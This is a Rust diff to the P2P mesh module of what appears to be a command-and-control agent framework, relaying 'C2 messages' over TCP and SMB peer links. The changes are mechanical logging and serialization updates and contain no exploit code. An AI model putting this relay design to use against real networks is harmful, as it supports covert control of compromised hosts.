@@ -41,6 +41,7 @@
 //! Uses `tokio::net::TcpListener` / `TcpStream` with length-prefix framing
 //! (4-byte LE u32 prefix) over TCP's stream-oriented transport.
 
+use common::lock::MutexExt;
 use ed25519_dalek::{Signature, Signer, SigningKey, Verifier, VerifyingKey};
 use serde::{Deserialize, Serialize};
 use std::collections::{HashMap, HashSet, VecDeque};
@@ -856,7 +857,7 @@ impl P2pMesh {
                             }
                             // ── Certificate enforcement ──
                             if link.peer_certificate.is_none() {
-                                log::error!(
+                                tracing::error!(
                                     "p2p: link {:#010X} transitioned to Connected without certificate — quarantining",
                                     link.link_id
                                 );
@@ -875,7 +876,7 @@ impl P2pMesh {
                                 spawn_parent_reader(mesh_arc, inbound_tx.clone());
                             }
 
-                            log::info!(
+                            tracing::info!(
                                 "P2P: connected to parent at {addr} via TCP, link_id={:#010X}",
                                 link_id
                             );
@@ -920,7 +921,7 @@ impl P2pMesh {
                             }
                             // ── Certificate enforcement ──
                             if link.peer_certificate.is_none() {
-                                log::error!(
+                                tracing::error!(
                                     "p2p: link {:#010X} transitioned to Connected without certificate — quarantining",
                                     link.link_id
                                 );
@@ -939,7 +940,7 @@ impl P2pMesh {
                                 spawn_parent_reader(mesh_arc, inbound_tx.clone());
                             }
 
-                            log::info!(
+                            tracing::info!(
                                 "P2P: connected to parent at {addr} via SMB, link_id={:#010X}",
                                 link_id
                             );
@@ -1001,7 +1002,7 @@ impl P2pMesh {
 
             // Remove the link from the mesh.
             if let Some(removed) = self.remove_link(*lid) {
-                log::info!(
+                tracing::info!(
                     "P2P: disconnected link {:#010X} (peer={}, role={:?})",
                     lid,
                     removed.peer_agent_id,
@@ -1453,7 +1454,7 @@ fn verify_peer_certificate_material(
             return Err(format!("mesh certificate signature verification failed: {e}"));
         }
     } else {
-        log::warn!(
+        tracing::warn!(
             "mesh certificate signature verification skipped: no server Ed25519 public key configured"
         );
     }
@@ -1504,7 +1505,7 @@ fn build_authenticated_link_payload(
         certificate: auth.certificate.clone(),
         identity_signature: signature,
     };
-    bincode::serialize(&wire).map_err(|e| anyhow::anyhow!("serialize Link handshake: {e}"))
+    bincode::serde::encode_to_vec(&wire, bincode::config::legacy()).map_err(|e| anyhow::anyhow!("serialize Link handshake: {e}"))
 }
 
 fn parse_authenticated_link_payload(
@@ -1513,7 +1514,7 @@ fn parse_authenticated_link_payload(
     link_id: u32,
     kind: u8,
 ) -> anyhow::Result<AuthenticatedPeer> {
-    let wire: WireLinkHandshake = bincode::deserialize(payload)
+    let wire: WireLinkHandshake = bincode::serde::decode_from_slice(payload, bincode::config::legacy()).map(|(v, _)| v)
         .map_err(|e| anyhow::anyhow!("authenticated Link handshake payload is invalid: {e}"))?;
 
     if wire.agent_id.len() > MAX_AGENT_ID_LEN {
@@ -1812,7 +1813,7 @@ pub fn handle_route_update(
     let entries = common::p2p_proto::deserialize_route_update(decrypted_payload)
         .map_err(|e| anyhow::anyhow!("failed to deserialize RouteUpdate: {e}"))?;
     link.merge_route_update(&entries, link_id);
-    log::debug!(
+    tracing::debug!(
         "RouteUpdate from link {:#010X}: {} entries merged (table size: {})",
         link_id,
         entries.len(),
@@ -1926,7 +1927,7 @@ pub fn handle_route_probe_reply(
         entry.route_quality * 0.95,
     );
 
-    log::debug!(
+    tracing::debug!(
         "RouteProbeReply from link {:#010X}: dest={:#010X}, hop_count={hop_count}",
         link_id,
         entry.destination
@@ -1964,7 +1965,7 @@ pub async fn handle_peer_discovery(
             .values()
             .any(|l| l.state.is_usable() && l.peer_agent_id == target.agent_id);
         if already_connected {
-            log::info!(
+            tracing::info!(
                 "PeerDiscovery: already connected to '{}', skipping",
                 target.agent_id
             );
@@ -1974,7 +1975,7 @@ pub async fn handle_peer_discovery(
 
         // Skip if we can't accept more peers.
         if !mesh.can_accept_peer() {
-            log::warn!(
+            tracing::warn!(
                 "PeerDiscovery: at peer capacity ({}/{}), skipping '{}'",
                 mesh.peer_link_ids.len(),
                 mesh.max_peers,
@@ -2002,7 +2003,7 @@ pub async fn handle_peer_discovery(
                             }
                             // ── Certificate enforcement ──
                             if link.peer_certificate.is_none() {
-                                log::error!(
+                                tracing::error!(
                                     "p2p: peer link {:#010X} transitioned to Connected without certificate — quarantining",
                                     link.link_id
                                 );
@@ -2012,7 +2013,7 @@ pub async fn handle_peer_discovery(
                             let lid = link.link_id;
                             mesh.insert_link(link);
                             spawn_child_relay(lid, mesh_arc.clone(), outbound_tx.clone());
-                            log::info!(
+                            tracing::info!(
                                 "PeerDiscovery: connected to '{}' via TCP peer link {:#010X}",
                                 agent_id,
                                 lid
@@ -2058,7 +2059,7 @@ pub async fn handle_peer_discovery(
                             }
                             // ── Certificate enforcement ──
                             if link.peer_certificate.is_none() {
-                                log::error!(
+                                tracing::error!(
                                     "p2p: peer link {:#010X} transitioned to Connected without certificate — quarantining",
                                     link.link_id
                                 );
@@ -2068,7 +2069,7 @@ pub async fn handle_peer_discovery(
                             let lid = link.link_id;
                             mesh.insert_link(link);
                             spawn_child_relay(lid, mesh_arc.clone(), outbound_tx.clone());
-                            log::info!(
+                            tracing::info!(
                                 "PeerDiscovery: connected to '{}' via SMB peer link {:#010X}",
                                 agent_id,
                                 lid
@@ -2399,14 +2400,14 @@ impl P2pMesh {
         let blob = match MeshRoutingBlob::from_bytes(decrypted_payload) {
             Ok(b) => b,
             Err(e) => {
-                log::warn!("handle_mesh_data_forward: failed to parse blob: {e}");
+                tracing::warn!("handle_mesh_data_forward: failed to parse blob: {e}");
                 return MeshRelayAction::Drop;
             }
         };
 
         // Check hop depth limit.
         if blob.hop_count > MAX_MESH_HOP_COUNT {
-            log::warn!(
+            tracing::warn!(
                 "mesh relay: dropping frame to {} — hop_count={} > max={}",
                 blob.destination,
                 blob.hop_count,
@@ -2421,7 +2422,7 @@ impl P2pMesh {
 
         // Check if this agent is the destination.
         if blob.destination == self.agent_id {
-            log::debug!(
+            tracing::debug!(
                 "mesh relay: delivering {}-byte payload locally",
                 blob.payload.len()
             );
@@ -2432,7 +2433,7 @@ impl P2pMesh {
         let next_agent_id = match blob.path.get(blob.current_hop as usize) {
             Some(id) => id.clone(),
             None => {
-                log::warn!(
+                tracing::warn!(
                     "mesh relay: path index {} out of bounds (path len={})",
                     blob.current_hop,
                     blob.path.len()
@@ -2445,7 +2446,7 @@ impl P2pMesh {
         let next_link_id = match self.link_id_by_peer(&next_agent_id) {
             Some(id) => id,
             None => {
-                log::warn!(
+                tracing::warn!(
                     "mesh relay: no link to next hop '{}' — dropping",
                     next_agent_id
                 );
@@ -2465,7 +2466,7 @@ impl P2pMesh {
 
         // Throttle check.
         if self.should_throttle_relay(blob_bytes.len() as u64) {
-            log::debug!(
+            tracing::debug!(
                 "mesh relay: throttling {} bytes to {} ({} active relays)",
                 blob_bytes.len(),
                 next_agent_id,
@@ -2484,7 +2485,7 @@ impl P2pMesh {
         let encrypted = match encrypt_payload(&next_key, &blob_bytes) {
             Ok(e) => e,
             Err(e) => {
-                log::warn!("mesh relay: encrypt failed for next hop: {e}");
+                tracing::warn!("mesh relay: encrypt failed for next hop: {e}");
                 return MeshRelayAction::Drop;
             }
         };
@@ -2541,7 +2542,7 @@ impl P2pMesh {
             return Err("mesh certificate is already expired".to_string());
         }
 
-        log::info!(
+        tracing::info!(
             "mesh certificate stored: expires_at={}, compartment={:?}",
             cert.expires_at,
             cert.compartment,
@@ -2579,7 +2580,7 @@ impl P2pMesh {
     ///
     /// Returns a list of link IDs that were terminated.
     pub fn handle_certificate_revocation(&mut self, revoked_hash: [u8; 32]) -> Vec<u32> {
-        log::warn!(
+        tracing::warn!(
             "mesh certificate revocation received for agent hash {:02x?}…",
             &revoked_hash[..8]
         );
@@ -2600,7 +2601,7 @@ impl P2pMesh {
 
         for id in dead_ids {
             if let Some(link) = self.links.get_mut(&id) {
-                log::warn!(
+                tracing::warn!(
                     "terminating link {:#010X} to revoked agent '{}'",
                     id,
                     link.peer_agent_id
@@ -2620,7 +2621,7 @@ impl P2pMesh {
     /// and optionally sends a QuarantineReport to the server.
     pub fn quarantine_peer(&mut self, target_agent_id: &str, reason: u8) -> Result<(), String> {
         let target_hash = common::hash_agent_id(target_agent_id);
-        log::warn!(
+        tracing::warn!(
             "quarantining agent '{}' (reason={})",
             target_agent_id,
             reason
@@ -2639,7 +2640,7 @@ impl P2pMesh {
         for id in link_ids {
             if let Some(link) = self.links.get_mut(&id) {
                 link.quarantined = true;
-                log::info!(
+                tracing::info!(
                     "link {:#010X} to '{}' marked as quarantined",
                     id,
                     target_agent_id
@@ -2653,7 +2654,7 @@ impl P2pMesh {
     /// Clear quarantine for a peer agent.
     pub fn clear_quarantine(&mut self, target_agent_id: &str) -> Result<(), String> {
         let target_hash = common::hash_agent_id(target_agent_id);
-        log::info!("clearing quarantine for agent '{}'", target_agent_id);
+        tracing::info!("clearing quarantine for agent '{}'", target_agent_id);
 
         self.quarantined_agents.remove(&target_hash);
 
@@ -2677,7 +2678,7 @@ impl P2pMesh {
     ///
     /// Terminates ALL peer links immediately and refuses new connections.
     pub fn activate_kill_switch(&mut self) {
-        log::warn!("MESH KILL SWITCH ACTIVATED — terminating all links");
+        tracing::warn!("MESH KILL SWITCH ACTIVATED — terminating all links");
         self.kill_switch_active = true;
 
         let all_ids: Vec<u32> = self.links.keys().copied().collect();
@@ -2693,7 +2694,7 @@ impl P2pMesh {
     ///
     /// Allows new connections to be established again.
     pub fn deactivate_kill_switch(&mut self) {
-        log::info!("mesh kill switch deactivated — new connections allowed");
+        tracing::info!("mesh kill switch deactivated — new connections allowed");
         self.kill_switch_active = false;
     }
 
@@ -2723,7 +2724,7 @@ impl P2pMesh {
 
     /// Set the mesh compartment for this agent.
     pub fn set_compartment(&mut self, compartment: String) {
-        log::info!("mesh compartment set to '{}'", compartment);
+        tracing::info!("mesh compartment set to '{}'", compartment);
         self.compartment = Some(compartment);
     }
 
@@ -2772,7 +2773,7 @@ impl P2pMesh {
 
         let new_public_bytes = *new_public.as_bytes();
 
-        log::info!(
+        tracing::info!(
             "key rotation initiated on link {:#010X} (peer={})",
             link_id,
             link.peer_agent_id
@@ -2827,7 +2828,7 @@ impl P2pMesh {
 
         let our_new_public_bytes = *our_new_public.as_bytes();
 
-        log::info!(
+        tracing::info!(
             "key rotation completed (responder side) on link {:#010X} (peer={})",
             link_id,
             link.peer_agent_id
@@ -2874,7 +2875,7 @@ impl P2pMesh {
         link.pending_rotation_secret = None;
         // Keep previous_key until overlap deadline passes.
 
-        log::info!(
+        tracing::info!(
             "key rotation completed (initiator side) on link {:#010X} (peer={})",
             link_id,
             link.peer_agent_id
@@ -2935,13 +2936,13 @@ impl P2pMesh {
                         if link.key_rotation_retries
                             >= common::p2p_proto::MAX_KEY_ROTATION_RETRIES as u32
                         {
-                            log::warn!(
+                            tracing::warn!(
                                 "key rotation on link {:#010X} exceeded max retries ({}), terminating",
                                 id, link.key_rotation_retries
                             );
                             true
                         } else {
-                            log::warn!(
+                            tracing::warn!(
                                 "key rotation on link {:#010X} timed out (attempt {}), will retry",
                                 id,
                                 link.key_rotation_retries
@@ -3069,7 +3070,7 @@ pub fn spawn_child_relay(
                 let link = match mesh_guard.links.get_mut(&link_id) {
                     Some(l) => l,
                     None => {
-                        log::warn!(
+                        tracing::warn!(
                             "child relay: link {:#010X} removed from mesh, exiting",
                             link_id
                         );
@@ -3082,7 +3083,7 @@ pub fn spawn_child_relay(
             let frame = match read_result {
                 Ok(f) => f,
                 Err(e) => {
-                    log::warn!(
+                    tracing::warn!(
                         "child relay: read error on {:#010X}: {} — exiting",
                         link_id,
                         e
@@ -3103,7 +3104,7 @@ pub fn spawn_child_relay(
                 let mesh_guard = mesh.lock().await;
                 if let Some(link) = mesh_guard.links.get(&link_id) {
                     if !link.is_authenticated() && link.state == LinkState::Connected {
-                        log::error!(
+                        tracing::error!(
                             "child relay: rejecting frame on unauthenticated link {:#010X} — quarantining",
                             link_id
                         );
@@ -3129,7 +3130,7 @@ pub fn spawn_child_relay(
                     let plaintext = match decrypt_payload(&key, &frame.payload) {
                         Ok(p) => p,
                         Err(e) => {
-                            log::warn!("child relay: decrypt error on {:#010X}: {}", link_id, e);
+                            tracing::warn!("child relay: decrypt error on {:#010X}: {}", link_id, e);
                             continue;
                         }
                     };
@@ -3138,7 +3139,7 @@ pub fn spawn_child_relay(
                         data: plaintext,
                     };
                     if outbound_tx.send(msg).await.is_err() {
-                        log::warn!(
+                        tracing::warn!(
                             "child relay: outbound channel closed for {:#010X}, exiting",
                             link_id
                         );
@@ -3155,7 +3156,7 @@ pub fn spawn_child_relay(
                     let plaintext = match decrypt_payload(&key, &frame.payload) {
                         Ok(p) => p,
                         Err(e) => {
-                            log::warn!(
+                            tracing::warn!(
                                 "child relay: mesh decrypt error on {:#010X}: {}",
                                 link_id,
                                 e
@@ -3178,7 +3179,7 @@ pub fn spawn_child_relay(
                                 data: payload,
                             };
                             if outbound_tx.send(msg).await.is_err() {
-                                log::warn!(
+                                tracing::warn!(
                                     "child relay: outbound channel closed for {:#010X}, exiting",
                                     link_id
                                 );
@@ -3229,7 +3230,7 @@ pub fn spawn_child_relay(
                                     };
                                     drop(mesh_guard);
                                     if let Err(e) = res {
-                                        log::warn!(
+                                        tracing::warn!(
                                             "child relay: mesh forward to {:#010X} failed: {}",
                                             next_link_id,
                                             e
@@ -3238,7 +3239,7 @@ pub fn spawn_child_relay(
                                 }
                                 _ => {
                                     drop(mesh_guard);
-                                    log::warn!(
+                                    tracing::warn!(
                                         "child relay: next hop {:#010X} not usable",
                                         next_link_id
                                     );
@@ -3251,7 +3252,7 @@ pub fn spawn_child_relay(
                             hop_count,
                         } => {
                             drop(mesh_guard);
-                            log::warn!(
+                            tracing::warn!(
                                 "child relay: route too deep {} -> {} ({} hops)",
                                 origin,
                                 destination,
@@ -3361,14 +3362,14 @@ pub fn spawn_child_relay(
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
                                     if let Err(e) = write_res {
-                                        log::warn!(
+                                        tracing::warn!(
                                             "child relay: KeyRotationAck write failed on {:#010X}: {}",
                                             link_id, e
                                         );
                                     }
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "child relay: KeyRotation error on {:#010X}: {}",
                                         link_id,
                                         e
@@ -3381,13 +3382,13 @@ pub fn spawn_child_relay(
                                 .handle_key_rotation_ack(link_id, &decrypted_frame.payload)
                             {
                                 Ok(()) => {
-                                    log::info!(
+                                    tracing::info!(
                                         "child relay: key rotation completed on {:#010X}",
                                         link_id
                                     );
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "child relay: KeyRotationAck error on {:#010X}: {}",
                                         link_id,
                                         e
@@ -3402,7 +3403,7 @@ pub fn spawn_child_relay(
                                     let terminated = mesh_guard
                                         .handle_certificate_revocation(data.revoked_agent_id_hash);
                                     if !terminated.is_empty() {
-                                        log::info!(
+                                        tracing::info!(
                                             "child relay: cert revocation terminated {} links on {:#010X}",
                                             terminated.len(), link_id
                                         );
@@ -3415,7 +3416,7 @@ pub fn spawn_child_relay(
                                     let _ = outbound_tx.send(msg).await;
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "child relay: CertificateRevocation parse error on {:#010X}: {}",
                                         link_id, e
                                     );
@@ -3426,7 +3427,7 @@ pub fn spawn_child_relay(
                             use common::p2p_proto::QuarantineReportData;
                             match QuarantineReportData::from_bytes(&decrypted_frame.payload) {
                                 Ok(data) => {
-                                    log::info!(
+                                    tracing::info!(
                                         "child relay: quarantine report from {:#010X}",
                                         link_id
                                     );
@@ -3439,7 +3440,7 @@ pub fn spawn_child_relay(
                                     let _ = outbound_tx.send(msg).await;
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "child relay: QuarantineReport parse error on {:#010X}: {}",
                                         link_id,
                                         e
@@ -3476,52 +3477,52 @@ async fn handle_control_frame_inner(
             if let Some(link) = mesh.links.get_mut(&link_id) {
                 match handle_heartbeat(link, &frame.payload) {
                     Ok(_ts) => {
-                        log::trace!("heartbeat from link {:#010X}", link_id);
+                        tracing::trace!("heartbeat from link {:#010X}", link_id);
                     }
                     Err(e) => {
-                        log::debug!("heartbeat parse error on {:#010X}: {}", link_id, e);
+                        tracing::debug!("heartbeat parse error on {:#010X}: {}", link_id, e);
                     }
                 }
             }
         }
         P2pFrameType::RouteUpdate => {
             if let Err(e) = handle_route_update(mesh, link_id, &frame.payload) {
-                log::debug!("RouteUpdate error on {:#010X}: {}", link_id, e);
+                tracing::debug!("RouteUpdate error on {:#010X}: {}", link_id, e);
             }
         }
         P2pFrameType::RouteProbe => {
             if let Err(e) = handle_route_probe(mesh, link_id, &frame.payload).await {
-                log::debug!("RouteProbe error on {:#010X}: {}", link_id, e);
+                tracing::debug!("RouteProbe error on {:#010X}: {}", link_id, e);
             }
         }
         P2pFrameType::RouteProbeReply => {
             if let Err(e) = handle_route_probe_reply(mesh, link_id, &frame.payload) {
-                log::debug!("RouteProbeReply error on {:#010X}: {}", link_id, e);
+                tracing::debug!("RouteProbeReply error on {:#010X}: {}", link_id, e);
             }
         }
         P2pFrameType::BandwidthProbe => {
             if let Err(e) = handle_bandwidth_probe(mesh, link_id, &frame.payload).await {
-                log::debug!("BandwidthProbe error on {:#010X}: {}", link_id, e);
+                tracing::debug!("BandwidthProbe error on {:#010X}: {}", link_id, e);
             }
         }
         P2pFrameType::PeerDiscovery => {
             // PeerDiscovery needs mesh_arc (Arc<Mutex<P2pMesh>>) which we
             // don't have here.  It is handled separately in the parent reader
             // where mesh_arc is available.  Skip it here.
-            log::debug!(
+            tracing::debug!(
                 "PeerDiscovery on link {:#010X} skipped in inner handler \
                  (handled by parent reader)",
                 link_id
             );
         }
         P2pFrameType::LinkDisconnect => {
-            log::info!("LinkDisconnect received on {:#010X}", link_id);
+            tracing::info!("LinkDisconnect received on {:#010X}", link_id);
             if let Some(link) = mesh.links.get_mut(&link_id) {
                 let _ = link.transition(LinkState::Dead);
             }
         }
         _ => {
-            log::debug!(
+            tracing::debug!(
                 "unhandled frame type {:?} on link {:#010X}",
                 frame.frame_type,
                 link_id
@@ -3563,7 +3564,7 @@ pub fn spawn_parent_reader(
                 match mesh_guard.parent_link_id {
                     Some(id) => id,
                     None => {
-                        log::info!("parent reader: no parent link in mesh, exiting");
+                        tracing::info!("parent reader: no parent link in mesh, exiting");
                         return;
                     }
                 }
@@ -3575,7 +3576,7 @@ pub fn spawn_parent_reader(
                 let link = match mesh_guard.links.get_mut(&parent_link_id) {
                     Some(l) if l.state.is_usable() => l,
                     Some(l) => {
-                        log::warn!(
+                        tracing::warn!(
                             "parent reader: parent link {:#010X} is {:?}, exiting",
                             parent_link_id,
                             l.state
@@ -3583,7 +3584,7 @@ pub fn spawn_parent_reader(
                         return;
                     }
                     None => {
-                        log::warn!(
+                        tracing::warn!(
                             "parent reader: parent link {:#010X} removed, exiting",
                             parent_link_id
                         );
@@ -3596,7 +3597,7 @@ pub fn spawn_parent_reader(
             let frame = match read_result {
                 Ok(f) => f,
                 Err(e) => {
-                    log::warn!(
+                    tracing::warn!(
                         "parent reader: read error on parent {:#010X}: {} — exiting",
                         parent_link_id,
                         e
@@ -3617,7 +3618,7 @@ pub fn spawn_parent_reader(
                 let mesh_guard = mesh.lock().await;
                 if let Some(link) = mesh_guard.links.get(&parent_link_id) {
                     if !link.is_authenticated() && link.state == LinkState::Connected {
-                        log::error!(
+                        tracing::error!(
                             "parent reader: rejecting frame on unauthenticated link {:#010X} — quarantining",
                             parent_link_id
                         );
@@ -3643,7 +3644,7 @@ pub fn spawn_parent_reader(
                     let plaintext = match decrypt_payload(&key, &frame.payload) {
                         Ok(p) => p,
                         Err(e) => {
-                            log::warn!(
+                            tracing::warn!(
                                 "parent reader: decrypt error on {:#010X}: {}",
                                 parent_link_id,
                                 e
@@ -3656,14 +3657,14 @@ pub fn spawn_parent_reader(
                     // The plaintext is a C2 message from the server,
                     // routed through the parent.  Deserialize with bincode
                     // and inject into the main loop.
-                    match bincode::deserialize::<common::Message>(&plaintext) {
+                    match bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v) {
                         Ok(msg) => {
-                            log::debug!(
+                            tracing::debug!(
                                 "parent reader: decoded {}-byte message from parent",
                                 plaintext.len()
                             );
                             if inbound_tx.send(msg).await.is_err() {
-                                log::warn!("parent reader: inbound channel closed, exiting");
+                                tracing::warn!("parent reader: inbound channel closed, exiting");
                                 return;
                             }
                         }
@@ -3677,11 +3678,11 @@ pub fn spawn_parent_reader(
                                     data: payload,
                                 };
                                 if inbound_tx.send(msg).await.is_err() {
-                                    log::warn!("parent reader: inbound channel closed, exiting");
+                                    tracing::warn!("parent reader: inbound channel closed, exiting");
                                     return;
                                 }
                             } else {
-                                log::warn!(
+                                tracing::warn!(
                                     "parent reader: failed to decode {}-byte payload from parent: {}",
                                     plaintext.len(),
                                     e
@@ -3702,7 +3703,7 @@ pub fn spawn_parent_reader(
                     let plaintext = match decrypt_payload(&key, &frame.payload) {
                         Ok(p) => p,
                         Err(e) => {
-                            log::warn!(
+                            tracing::warn!(
                                 "parent reader: mesh decrypt error on {:#010X}: {}",
                                 parent_link_id,
                                 e
@@ -3718,17 +3719,17 @@ pub fn spawn_parent_reader(
                             drop(mesh_guard);
                             // The parent reader has inbound_tx — deliver
                             // the decoded message to the main agent loop.
-                            match bincode::deserialize::<common::Message>(&payload) {
+                            match bincode::serde::decode_from_slice(&payload, bincode::config::legacy()).map(|(v, _)| v) {
                                 Ok(msg) => {
                                     if inbound_tx.send(msg).await.is_err() {
-                                        log::warn!(
+                                        tracing::warn!(
                                             "parent reader: inbound channel closed, exiting"
                                         );
                                         return;
                                     }
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "parent reader: failed to decode mesh payload: {}",
                                         e
                                     );
@@ -3779,7 +3780,7 @@ pub fn spawn_parent_reader(
                                     };
                                     drop(mesh_guard);
                                     if let Err(e) = res {
-                                        log::warn!(
+                                        tracing::warn!(
                                             "parent reader: mesh forward to {:#010X} failed: {}",
                                             next_link_id,
                                             e
@@ -3788,7 +3789,7 @@ pub fn spawn_parent_reader(
                                 }
                                 _ => {
                                     drop(mesh_guard);
-                                    log::warn!(
+                                    tracing::warn!(
                                         "parent reader: next hop {:#010X} not usable",
                                         next_link_id
                                     );
@@ -3801,7 +3802,7 @@ pub fn spawn_parent_reader(
                             hop_count,
                         } => {
                             drop(mesh_guard);
-                            log::warn!(
+                            tracing::warn!(
                                 "parent reader: route too deep {} -> {} ({} hops)",
                                 origin,
                                 destination,
@@ -3898,14 +3899,14 @@ pub fn spawn_parent_reader(
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
                                     if let Err(e) = write_res {
-                                        log::warn!(
+                                        tracing::warn!(
                                             "parent reader: KeyRotationAck write failed on {:#010X}: {}",
                                             parent_link_id, e
                                         );
                                     }
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "parent reader: KeyRotation error on {:#010X}: {}",
                                         parent_link_id,
                                         e
@@ -3918,13 +3919,13 @@ pub fn spawn_parent_reader(
                                 .handle_key_rotation_ack(parent_link_id, &decrypted_frame.payload)
                             {
                                 Ok(()) => {
-                                    log::info!(
+                                    tracing::info!(
                                         "parent reader: key rotation completed on {:#010X}",
                                         parent_link_id
                                     );
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "parent reader: KeyRotationAck error on {:#010X}: {}",
                                         parent_link_id,
                                         e
@@ -3939,7 +3940,7 @@ pub fn spawn_parent_reader(
                                     let terminated = mesh_guard
                                         .handle_certificate_revocation(data.revoked_agent_id_hash);
                                     if !terminated.is_empty() {
-                                        log::info!(
+                                        tracing::info!(
                                             "parent reader: cert revocation terminated {} links",
                                             terminated.len()
                                         );
@@ -3952,7 +3953,7 @@ pub fn spawn_parent_reader(
                                     let _ = inbound_tx.send(msg).await;
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "parent reader: CertificateRevocation parse error: {}",
                                         e
                                     );
@@ -3963,7 +3964,7 @@ pub fn spawn_parent_reader(
                             use common::p2p_proto::QuarantineReportData;
                             match QuarantineReportData::from_bytes(&decrypted_frame.payload) {
                                 Ok(data) => {
-                                    log::info!(
+                                    tracing::info!(
                                         "parent reader: quarantine report from parent {:#010X}",
                                         parent_link_id
                                     );
@@ -3976,7 +3977,7 @@ pub fn spawn_parent_reader(
                                     let _ = inbound_tx.send(msg).await;
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "parent reader: QuarantineReport parse error: {}",
                                         e
                                     );
@@ -3993,7 +3994,7 @@ pub fn spawn_parent_reader(
                             )
                             .await
                             {
-                                log::debug!(
+                                tracing::debug!(
                                     "PeerDiscovery error on parent {:#010X}: {}",
                                     parent_link_id,
                                     e
@@ -4219,7 +4220,7 @@ pub fn spawn_heartbeat_task(
                                     // If it exceeds the dead threshold, mark it.
                                     let is_dead = link.quality.record_missed_heartbeat();
                                     if is_dead {
-                                        log::warn!(
+                                        tracing::warn!(
                                             "P2P link {:#010X} exceeded dead threshold \
                                              ({} consecutive failures)",
                                             lid,
@@ -4231,7 +4232,7 @@ pub fn spawn_heartbeat_task(
                                     }
 
                                     if let Err(e) = send_heartbeat(link).await {
-                                        log::warn!(
+                                        tracing::warn!(
                                             "P2P heartbeat send failed on link {:#010X}: {}",
                                             lid, e
                                         );
@@ -4245,7 +4246,7 @@ pub fn spawn_heartbeat_task(
                         for lid in &send_errors {
                             if let Some(link) = mesh_guard.links.get_mut(lid) {
                                 if link.state != LinkState::Dead {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "P2P link {:#010X} marked dead (heartbeat send failed)",
                                         lid
                                     );
@@ -4267,7 +4268,7 @@ pub fn spawn_heartbeat_task(
                         // Transition timed-out links to Dead.
                         for lid in &dead {
                             if let Some(link) = mesh_guard.links.get_mut(lid) {
-                                log::warn!(
+                                tracing::warn!(
                                     "P2P link {:#010X} timed out (no activity for >{:?}), marking dead",
                                     lid, dead_timeout
                                 );
@@ -4341,7 +4342,7 @@ pub fn spawn_heartbeat_task(
                                 bandwidth_bps: *bandwidth_bps,
                             };
                             if let Err(e) = outbound_tx.send(report).await {
-                                log::warn!(
+                                tracing::warn!(
                                     "P2pLinkFailureReport: outbound channel error: {}",
                                     e
                                 );
@@ -4360,7 +4361,7 @@ pub fn spawn_heartbeat_task(
                                 // Parent link died. In Mesh/Hybrid mode, flood
                                 // RouteProbe to discover alternate paths.
                                 if mesh_guard.mesh_mode != MeshMode::Tree {
-                                    log::info!(
+                                    tracing::info!(
                                         "P2P parent link {:#010X} died; flooding RouteProbe \
                                          to find alternate paths",
                                         dead_lid
@@ -4375,7 +4376,7 @@ pub fn spawn_heartbeat_task(
                                                 if let Err(e) = send_route_probe(
                                                     link, 0, // destination=server
                                                 ).await {
-                                                    log::warn!(
+                                                    tracing::warn!(
                                                         "RouteProbe flood failed on {:#010X}: {}",
                                                         lid, e
                                                     );
@@ -4389,7 +4390,7 @@ pub fn spawn_heartbeat_task(
                                 // if we have fewer than 2 paths to the server.
                                 let paths = mesh_guard.count_server_paths();
                                 if paths < 2 && mesh_guard.mesh_mode != MeshMode::Tree {
-                                    log::info!(
+                                    tracing::info!(
                                         "P2P only {} path(s) to server; requesting \
                                          peer reconnect",
                                         paths
@@ -4400,26 +4401,26 @@ pub fn spawn_heartbeat_task(
                                             data: br#"{"type":"PeerReconnect"}"#.to_vec(),
                                         }
                                     ).await {
-                                        log::warn!("PeerReconnect send failed: {}", e);
+                                        tracing::warn!("PeerReconnect send failed: {}", e);
                                     }
                                 }
 
                                 if !dead_link.pending_forwards.is_empty() {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "P2P parent link {:#010X} died with {} buffered forwards; \
                                          waiting for server re-link",
                                         dead_lid,
                                         dead_link.pending_forwards.len()
                                     );
                                 }
-                                log::info!(
+                                tracing::info!(
                                     "P2P parent link {:#010X} removed; awaiting server re-link",
                                     dead_lid
                                 );
                             } else {
                                 // Child or peer link died.
                                 let link_kind = if is_peer { "peer" } else { "child" };
-                                log::info!(
+                                tracing::info!(
                                     "P2P {} link {:#010X} (agent={}) removed",
                                     link_kind,
                                     dead_lid,
@@ -4448,7 +4449,7 @@ pub fn spawn_heartbeat_task(
                     };
 
                     if let Err(e) = outbound_tx.send(report).await {
-                        log::warn!(
+                        tracing::warn!(
                             "P2P topology report: outbound channel closed: {}",
                             e
                         );
@@ -4489,7 +4490,7 @@ pub fn spawn_heartbeat_task(
                     };
 
                     if let Err(e) = outbound_tx.send(enhanced).await {
-                        log::warn!(
+                        tracing::warn!(
                             "P2P enhanced topology report: outbound channel closed: {}",
                             e
                         );
@@ -4516,7 +4517,7 @@ pub fn spawn_heartbeat_task(
                         if let Some(link) = mesh_guard.links.get_mut(lid) {
                             if link.state.is_usable() {
                                 if let Err(e) = send_route_update(link, &snapshot).await {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "RouteUpdate send failed on link {:#010X}: {}",
                                         lid, e
                                     );
@@ -4540,7 +4541,7 @@ pub fn spawn_heartbeat_task(
                         if let Some(link) = mesh_guard.links.get_mut(lid) {
                             if link.state.is_usable() {
                                 if let Err(e) = send_bandwidth_probe(link).await {
-                                    log::debug!(
+                                    tracing::debug!(
                                         "BandwidthProbe failed on link {:#010X}: {}",
                                         lid, e
                                     );
@@ -4601,7 +4602,7 @@ pub fn handle_heartbeat(link: &mut P2pLink, decrypted_payload: &[u8]) -> anyhow:
 pub mod tcp_transport {
     use super::*;
     use anyhow::{anyhow, Result};
